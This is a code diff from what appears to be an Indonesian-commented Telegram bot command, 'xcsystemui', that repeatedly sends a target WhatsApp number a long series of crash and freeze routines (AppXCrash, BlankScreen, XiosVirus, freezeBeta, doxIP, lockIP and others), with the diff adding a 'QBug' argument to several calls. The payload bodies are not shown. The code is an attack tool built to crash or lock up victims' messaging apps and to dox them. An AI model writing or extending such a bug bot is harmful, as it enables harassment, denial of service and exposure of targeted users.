@@ -808,36 +808,36 @@ bot.command("xcsystemui", checkWhatsAppConnection, async ctx => {
   // Melakukan proses freezing 92 kali
   for (let i = 0; i < 3; i++) {
     await LocSystem(target);
-    await f10(target, { ptcp: true });
+    await f10(target, QBug, { ptcp: true });
     await QDIphone(target);
-    await XeonXRobust(target, { ptcp: true });
+    await XeonXRobust(target, QBug, { ptcp: true });
     await thunderblast_doc(target);
     await thunderblast_notif(target, { ptcp: true });
     await AppXCrash(target);
-    await SmCrash(target);
+    await SmCrash(target, QBug);
     await UpiCrash(target); 
-    await newsLetter(target, { ptcp: true }); 
+    await newsLetter(target, QBug, { ptcp: true }); 
     await SqCrash(target);
     await FBiphone(target);
     await QXIphone(target);
     await QPayIos(target);
-    await freezefile(target, { ptcp: true }); 
+    await freezefile(target, QBug, { ptcp: true }); 
     await QPayStriep(target);
-    await crashui2(target, { ptcp: true });
+    await crashui2(target, QBug, { ptcp: true });
     await VenCrash(target); 
-    await IosMJ(target);
+    await IosMJ(target, QBug);
     await BlankScreen(target, { ptcp: true }); 
     await XiosVirus(target);
     await systemUi(target, { ptcp: true });
     await freezeBeta1(target);
     await sendxoMessage(target);
     await freezekamoflase(target);
-    await blank(target);
+    await blank(target, QBug);
     await bugDocu(target);
-    await bugBetaDox(target);
+    await bugBetaDox(target, QBug);
     await crashBeta(target);
     await doxIP(target);
-    await lockIP(target);
+    await lockIP(target, QBug);
     await freezeBeta2(target);
     await XeonXRobust( target, { ptcp: true});
   }
